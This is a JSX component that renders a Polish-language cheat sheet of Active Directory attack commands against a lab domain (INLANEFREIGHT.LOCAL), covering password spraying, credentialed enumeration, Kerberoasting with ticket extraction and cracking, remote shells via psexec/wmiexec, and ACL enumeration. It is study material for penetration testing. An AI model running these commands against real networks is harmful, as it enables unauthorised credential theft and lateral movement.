

const ActiveDirectoryCommands = () =>{
    return(
        <section>
            <h1>Active Directory</h1>

            <h2>Password Spraying & Password Policies</h2>
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td>
                    <td>Używa <code>CrackMapExec</code> i prawidłowych danych uwierzytelniających (<span className='important'>avazquez:Password123</span>) do wyliczenia polityki haseł (<span className='important'>--pass-pol</span>) z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>rpcclient -U "" -N 172.16.5.5</code></td>
                    <td>Używa <code>rpcclient</code> do odkrywania informacji o domenie poprzez sesje <code>SMB NULL</code>. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>rpcclient $&gt; querydominfo</code></td>
                    <td>Używa <code>rpcclient</code> do wyliczenia zasad haseł w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>enum4linux -P 172.16.5.5</code></td>
                    <td>Używa <code>enum4linux</code> do wyliczenia zasad haseł (<code>-P</code>) w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength</code></td>
                    <td>Używa <code>ldapsearch</code> do wyliczenia zasad haseł w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>net accounts</code></td>
                    <td>Służy do wyliczania zasad haseł w domenie systemu Windows z hosta z systemem Windows. CMD net.exe</td>
                    </tr>
                    <tr>
                    <td><code>Import-Module .\PowerView.ps1</code></td>
                    <td>Używa polecenia cmd-let Import-Module do importowania narzędzia <span className='important'>PowerView.ps1</span> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainPolicy</code></td>
                    <td>Służy do wyliczania zasad haseł w docelowej domenie systemu Windows z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"</code></td>
                    <td>Używa <code>enum4linux</code> do wykrywania kont użytkowników w docelowej domenie Windows, a następnie wykorzystuje <code>grep</code> do filtrowania danych wyjściowych w celu wyświetlenia użytkownika z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>rpcclient -U "" -N 172.16.5.5 rpcclient $&gt; enumdomuser</code></td>
                    <td>Używa rpcclient do wykrywania kont użytkowników w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>crackmapexec smb 172.16.5.5 --users</code></td>
                    <td>Używa <code>CrackMapExec</code> do wykrywania użytkowników (<span className='important'>--users</span>) w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&amp;(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "</code></td>
                    <td>Używa <code>ldapsearch</code> do wykrywania użytkowników w docelowej domenie Windows, a następnie filtruje dane wyjściowe za pomocą <code>grep</code>, aby wyświetlić tylko <code>sAMAccountName</code> z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td>
                    <td>Używa narzędzia Pythona <code>windapsearch.py</code> do wykrywania użytkowników w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done</code></td>
                    <td>Jednowierszowy Bash używany do przeprowadzania ataku polegającego na rozpylaniu haseł przy użyciu <code>rpcclient</code> i listy użytkowników (<code>valid_users.txt</code>) z hosta opartego na systemie Linux. Filtruje także nieudane próby oczyszczenia wyniku.</td>
                    </tr>
                    <tr>
                    <td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1</code></td>
                    <td>Używa <span className='important'>kerbrute</span> i listy użytkowników (<span className='important'>valid_users.txt</span>) do przeprowadzenia ataku polegającego na rozpylaniu haseł na docelową domenę Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></td>
                    <td>Używa <span className='important'>kerbrute</span> i listy użytkowników (<span className='important'>jsmith.txt</span>) do przeprowadzenia ataku polegającego na rozpylaniu użytkowników.</td>
                    </tr>
                    <tr>
                    <td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></td>
                    <td>Używa <span className='important'>CrackMapExec</span> i listy użytkowników (<span className='important'>valid_users.txt</span>) do przeprowadzenia ataku polegającego na rozpylaniu haseł na docelową domenę Windows z hosta opartego na systemie Linux. Filtruje także błędy logowania za pomocą <code>grep</code></td>
                    </tr>
                    <tr>
                    <td><code> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td>
                    <td>Używa <code>CrackMapExec</code> do sprawdzania poprawności zestawu danych uwierzytelniających z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></td>
                    <td>Używa <code>CrackMapExec</code> i flagi -<code>-local-auth</code>, aby mieć pewność, że zostanie przeprowadzona tylko jedna próba logowania z hosta opartego na systemie Linux. Ma to na celu zapewnienie, że konta nie zostaną zablokowane przez wymuszone zasady dotyczące haseł. Filtruje także błędy logowania za pomocą <code>grep</code>.</td>
                    </tr>
                    <tr>
                    <td></td>
                    <td>Służy do importowania narzędzia opartego na programie PowerShell <code>DomainPasswordSpray.ps1</code> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Import-Module .\DomainPasswordSpray.ps1</code></td>
                    <td>Służy do importowania narzędzia opartego na programie PowerShell <code>DomainPasswordSpray.ps1</code> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td>
                    <td>Wykonuje atak polegający na rozpylaniu hasła i wysyła (-OutFile) wyniki do określonego pliku (<code>spray_success</code>) z hosta z systemem Windows.</td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>Credentialed Enumeration</h2>
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th>Komenda</th>
                    <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td>
                    <td>Uwierzytelnia się z obiektem docelowym Windows za pośrednictwem <code>smb</code> przy użyciu prawidłowych poświadczeń i próbuje wykryć więcej użytkowników (<code>--users</code>) w docelowej domenie Windows. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td>
                    <td>Uwierzytelnia się z obiektem docelowym Windows za pośrednictwem <code>smb</code> przy użyciu prawidłowych poświadczeń i próbuje wykryć grupy (<code>--groups</code>) w docelowej domenie Windows. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td>
                    <td>Uwierzytelnia się w docelowym systemie Windows za pośrednictwem <code>smb</code> przy użyciu prawidłowych poświadczeń i próbuje sprawdzić listę zalogowanych użytkowników (<code>--loggedon-users</code>) na docelowym hoście Windows. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td>
                    <td>Uwierzytelnia się z obiektem docelowym Windows za pośrednictwem <code>smb</code> przy użyciu prawidłowych poświadczeń i próbuje wykryć jakiekolwiek udziały SMB (<code>--shares</code>). Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td>
                    <td>Uwierzytelnia się z obiektem docelowym Windows przez <code>smb</code> przy użyciu prawidłowych danych uwierzytelniających i wykorzystuje moduł CrackMapExec (<code>-M</code>) <code>spider_plus</code> do przeglądania każdego czytelnego udziału (<code >Dev-share</code>) i wyświetl listę wszystkich możliwych do odczytania plików. Wyniki są wyświetlane w formacie <code>JSON</code>. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td>
                    <td>Wylicza docelową domenę systemu Windows przy użyciu prawidłowych poświadczeń i wyświetla listę udziałów &amp; uprawnienia dostępne na każdym z nich w kontekście używanych prawidłowych poświadczeń i docelowego hosta Windows (<code>-H</code>). Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td>
                    <td>Wylicza docelową domenę Windows przy użyciu prawidłowych poświadczeń i wykonuje rekurencyjną listę (<code>-R</code>) określonego udziału (<code>SYSVOL</code>) i wyświetla tylko listę katalogów (<code>- -dir-only</code>) w udziale. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code> rpcclient $&gt; queryuser 0x457</code></td>
                    <td>Wylicza docelowe konto użytkownika w domenie Windows przy użyciu jego względnego identyfikatora (<code>0x457</code>). Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>rpcclient $&gt; enumdomusers</code></td>
                    <td>Wykrywa konta użytkowników w docelowej domenie Windows i powiązane z nimi względne identyfikatory (<code>rid</code>). Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 </code></td>
                    <td>Narzędzie Impacket używane do łączenia się z <code>CLI</code> obiektu docelowego Windows za pośrednictwem udziału administracyjnego <code>ADMIN$</code> z prawidłowymi poświadczeniami. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 </code></td>
                    <td>Narzędzie Impacket używane do łączenia się z <code>CLI</code> obiektu docelowego Windows za pośrednictwem <code>WMI</code> z prawidłowymi poświadczeniami. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>windapsearch.py -h</code></td>
                    <td>Służy do wyświetlania opcji i funkcjonalności windapsearch.py. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da</code></td>
                    <td>Służy do wyliczania grupy administratorów domeny (<code>--da</code>) przy użyciu prawidłowego zestawu poświadczeń w docelowej domenie Windows. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU</code></td>
                    <td>Służy do wyszukiwania rekurencyjnego (<code>-PU</code>) dla użytkowników z zagnieżdżonymi uprawnieniami i przy użyciu prawidłowych poświadczeń. Wykonywane z hosta opartego na systemie Linux.</td>
                    </tr>

                    <tr>
                    <td><code>Get-Module</code></td>
                    <td>Polecenie cmd-let programu PowerShell używane do wyświetlania listy wszystkich dostępnych modułów, ich wersji i opcji poleceń z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Import-Module ActiveDirectory</code></td>
                    <td>Ładuje moduł <code>Active Directory</code> PowerShell z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADDomain</code></td>
                    <td>Polecenie cmd programu PowerShell używane do zbierania informacji o domenie systemu Windows z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADUser -Filter {`{ServicePrincipalName -ne "$null"}`} -Properties ServicePrincipalName</code></td>
                    <td>Polecenie cmd programu PowerShell używane do wyliczania kont użytkowników w docelowej domenie systemu Windows i filtrowania według <code>ServicePrincipalName</code>. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADTrust -Filter *</code></td>
                    <td>Polecenie cmd programu PowerShell używane do wyliczania wszelkich relacji zaufania w docelowej domenie systemu Windows i filtrowania według dowolnego (<code>-Filter *</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADGroup -Filter * | select name</code></td>
                    <td>Polecenie cmd programu PowerShell używane do wyliczania grup w docelowej domenie systemu Windows i filtrowania według nazwy grupy (<code>select name</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADGroup -Identity "Backup Operators"</code></td>
                    <td>Polecenie cmd programu PowerShell używane do wyszukiwania określonej grupy (<code>-Identity „Operatorzy kopii zapasowych”</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ADGroupMember -Identity "Backup Operators"</code></td>
                    <td>Polecenie cmd programu PowerShell używane do wykrywania członków określonej grupy (<code>-Identity „Operatorzy kopii zapasowych”</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Export-PowerViewCSV</code></td>
                    <td>Skrypt PowerView używany do dołączania wyników do pliku <code>CSV</code>. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>ConvertTo-SID</code></td>
                    <td>Skrypt PowerView używany do konwersji nazwy <code>Użytkownika</code> lub <code>Grupy</code> na jej <code>SID</code>. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainSPNTicket</code></td>
                    <td>Skrypt PowerView używany do żądania biletu Kerberos dla określonej nazwy głównej usługi (<code>SPN</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-Domain</code></td>
                    <td>Skrypt PowerView używany do zwracania obiektu AD dla bieżącej (lub określonej) domeny. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainController</code></td>
                    <td>Skrypt PowerView używany do zwracania listy docelowych kontrolerów domeny dla określonej domeny docelowej. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainUser</code></td>
                    <td>Skrypt PowerView używany do zwracania wszystkich użytkowników lub określonych obiektów użytkowników w AD. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainComputer</code></td>
                    <td>Skrypt PowerView używany do zwracania wszystkich komputerów lub określonych obiektów komputerów w usłudze AD. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainGroup</code></td>
                    <td>Skrypt PowerView używany do zwracania wszystkich grup lub określonych obiektów grupowych w AD. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainOU</code></td>
                    <td>Skrypt PowerView używany do wyszukiwania wszystkich lub określonych obiektów OU w AD. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Find-InterestingDomainAcl</code></td>
                    <td>Skrypt PowerView używany do wyszukiwania <code>list ACL</code> obiektów w domenie z uprawnieniami do modyfikacji ustawionymi na obiekty niewbudowane. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainGroupMember</code></td>
                    <td>Skrypt PowerView używany do zwracania członków określonej grupy domen. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainFileServer</code></td>
                    <td>Skrypt PowerView używany do zwracania listy serwerów, które prawdopodobnie działają jako serwery plików. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainDFSShare</code></td>
                    <td>Skrypt PowerView używany do zwracania listy wszystkich rozproszonych systemów plików dla bieżącej (lub określonej) domeny. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainGPO</code></td>
                    <td>Skrypt PowerView używany do zwracania wszystkich obiektów GPO lub określonych obiektów GPO w usłudze AD. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainPolicy</code></td>
                    <td>Skrypt PowerView używany do zwracania domyślnych zasad domeny lub zasad kontrolera domeny dla bieżącej domeny. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Get-NetLocalGroup</code></td>
                    <td>Skrypt PowerView używany do wyliczania grup lokalnych na komputerze lokalnym lub zdalnym. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-NetLocalGroupMember</code></td>
                    <td>Skrypt PowerView wylicza członków określonej grupy lokalnej. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Get-NetShare</code></td>
                    <td>Skrypt PowerView używany do zwracania listy otwartych udziałów na komputerze lokalnym (lub zdalnym). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-NetSession</code></td>
                    <td>Skrypt PowerView używany do zwracania informacji o sesji dla komputera lokalnego (lub zdalnego). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Test-AdminAccess</code></td>
                    <td>Skrypt PowerView używany do testowania, czy bieżący użytkownik ma dostęp administracyjny do komputera lokalnego (lub zdalnego). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Find-DomainUserLocation</code></td>
                    <td>Skrypt PowerView używany do wyszukiwania komputerów, na których zalogowani są konkretni użytkownicy. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Find-DomainShare</code></td>
                    <td>Skrypt PowerView używany do wyszukiwania dostępnych udziałów na komputerach domeny. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Find-InterestingDomainShareFile</code></td>
                    <td>Skrypt PowerView wyszukujący pliki spełniające określone kryteria w czytelnych udziałach w domenie. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Find-LocalAdminAccess</code></td>
                    <td>Skrypt PowerView używany do wyszukiwania komputerów w domenie lokalnej, do których bieżący użytkownik ma dostęp administratora lokalnego. Wykonywany z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainTrust</code></td>
                    <td>Skrypt PowerView, który zwraca zaufanie domeny dla bieżącej domeny lub określonej domeny. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-ForestTrust</code></td>
                    <td>Skrypt PowerView, który zwraca wszystkie relacje zaufania lasów dla bieżącego lasu lub określonego lasu. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainForeignUser</code></td>
                    <td>Skrypt PowerView wyliczający użytkowników znajdujących się w grupach poza domeną użytkownika. Wykonywane z hosta opartego na systemie Windows</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainForeignGroupMember</code></td>
                    <td>Skrypt PowerView, który wylicza grupy zawierające użytkowników spoza domeny grupy i zwraca każdego zagranicznego członka. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainTrustMapping</code></td>
                    <td>Skrypt PowerView, który wylicza wszystkie relacje zaufania dla bieżącej domeny i wszystkich innych zaobserwowanych. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td>
                    <td>Skrypt PowerView używany do wyświetlania listy wszystkich członków grupy docelowej (<code>"Administratorzy domeny"</code>) poprzez użycie opcji recurse (<code>-Recurse</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td>
                    <td>Skrypt PowerView używany do wyszukiwania użytkowników w docelowej domenie Windows, którzy mają ustawioną <code>główną nazwę usługi</code>. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data</code></td>
                    <td>Uruchamia narzędzie o nazwie <code>Snaffler</code> w docelowej domenie Windows, które wyszukuje różnego rodzaju dane w udziałach, do których ma dostęp zaatakowane konto. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td></td>
                    <td></td>
                    </tr>
                    <tr>
                    <td>SharpHound.ps1</td>
                    <td></td>
                    </tr>
                    <tr>
                    <td>Invoke-BloodHound -CollectionMethond All -Domain {`<Nazwa domeny np: MARVEL.local>`} -ZipFileName file.zip</td>
                    <td>Zbiera wszystkie dane z danej domeny do BloodHound</td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>Kerberoasting</h2>
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th>Komenda</th>
                    <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>GetUserSPNs.py -h</code></td>
                    <td>Narzędzie Impacket używane do wyświetlania opcji i funkcjonalności <code>GetUserSPNs.py</code> z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td>
                    <td>Narzędzie Impacket używane do pobierania listy <code>SPN</code> w docelowej domenie Windows z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td>
                    <td>Narzędzie Impacket służące do pobierania/żądania (<code>-request</code>) wszystkich biletów TGS do przetwarzania w trybie offline z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td>
                    <td>Narzędzie Impacket używane do pobierania/żądania (<code>-request-user</code>) biletu TGS dla określonego konta użytkownika (<code>sqldev</code>) z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td>
                    <td>Narzędzie Impacket używane do pobierania/żądania biletu TGS dla określonego konta użytkownika i zapisywania biletu do pliku (<code>-outputfile sqldev_tgs</code>) na hoście opartym na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td>
                    <td>Próba złamania skrótu biletu Kerberos (<code>-m 13100</code>) (<code>sqldev_tgs</code>) przy użyciu <code>hashcat</code> i listy słów (<code>rockyou.txt</ code>) z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"</code></td>
                    <td>Skrypt PowerShell używany do pobierania/żądania biletu TGS określonego użytkownika z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % {`{ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`}</code></td>
                    <td>Służy do pobierania/żądania wszystkich biletów TGS z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>mimikatz # base64 /out:true</code></td>
                    <td>Komenda <code>Mimikatz</code> zapewniająca wyodrębnienie biletów TGS w formacie <code>base64</code> z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>kerberos::list /export </code></td>
                    <td>Komenda <code>Mimikatz</code> używana do wyodrębniania biletów TGS z hosta działającego w systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>echo "&lt;base64 blob&gt;" | tr -d \\n </code></td>
                    <td>Służy do przygotowania biletu TGS w formacie base64 do crackowania z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></td>
                    <td>Służy do wyprowadzania pliku (<code>encoded_file</code>) do pliku .kirbi w formacie base64 (<code>base64 -d &gt; sqldev.kirbi</code>) z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td>
                    <td>Służy do wyodrębniania <code>biletu Kerberos</code>. Spowoduje to również utworzenie pliku o nazwie <code>crack_file</code> z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat</code></td>
                    <td>Służy do modyfikowania <code>crack_file</code> dla <code>Hashcat</code> z hosta opartego na systemie Linux.</td>
                    </tr>
                    <tr>
                    <td><code>Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname</code></td>
                    <td>Używa narzędzia PowerView do wyodrębnienia <code>biletów TGS</code>. Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></td>
                    <td>Narzędzie PowerView służące do pobierania/żądania biletu TGS określonego biletu i automatycznego formatowania go dla <code>Hashcat</code> z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td>
                    <td>Eksportuje wszystkie bilety TGS do pliku <code>.CSV</code> (<code>ilfreight_tgs.csv</code>) z hosta działającego w systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>.\Rubeus.exe kerberoast /stats</code></td>
                    <td>Służy do sprawdzania statystyk protokołu kerberoast (<code>/stats</code>) w docelowej domenie Windows z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></td>
                    <td>Służy do żądania/pobierania biletów TGS dla kont z liczbą <code>admin</code> ustawioną na <code>1</code>, a następnie formatuje dane wyjściowe w łatwy do przeglądania &amp; sposób crackowania (<code>/nowrap</code>) . Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td>
                    <td>Służy do żądania/pobierania biletu TGS dla konkretnego użytkownika (<code>/user:testspn</code>). Formatuje dane wyjściowe w łatwy do przeglądania &amp; sposób crackowania (<code>/nowrap</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td>
                    <td>Narzędzie PowerView służące do sprawdzania atrybutu <code>msDS-SupportedEncryptionType</code> powiązanego z konkretnym kontem użytkownika (<code>testspn</code>). Wykonywane z hosta opartego na systemie Windows.</td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>Wyliczanie i taktyka ACL - ACL Enumeration & Tactics</h2>

            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th>Komenda</th>
                    <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>Find-InterestingDomainAcl</code></td>
                    <td>Narzędzie PowerView służące do wyszukiwania list ACL obiektów w docelowej domenie systemu Windows z uprawnieniami do modyfikacji ustawionymi na obiekty niewbudowane z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley</code></td>
                    <td>Służy do importowania programu PowerView i pobierania <code>SID</code> określonego konta użytkownika (<code>wley</code>) z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
                    <td><code>Get-DomainObjectACL -Identity * | ? {`{$_.SecurityIdentifier -eq $sid}`}</code></td>
                    <td>Służy do wyszukiwania wszystkich obiektów domeny systemu Windows, do których użytkownik ma prawa, poprzez mapowanie <code>SID</code> użytkownika na właściwość <code>SecurityIdentifier</code> z hosta opartego na systemie Windows.</td>
                    </tr>
                    <tr>
                    <td><code>$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {`{ObjectClass -like 'ControlAccessRight'}`} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{`{$_.rightsGuid -eq $guid}`} | fl</code></td>
                    <td>Służy do wyszukiwania wstecznego &amp; mapuj na wartość <code>GUID</code> z hosta z systemem Windows.</td>
                    </tr>
                    <tr>
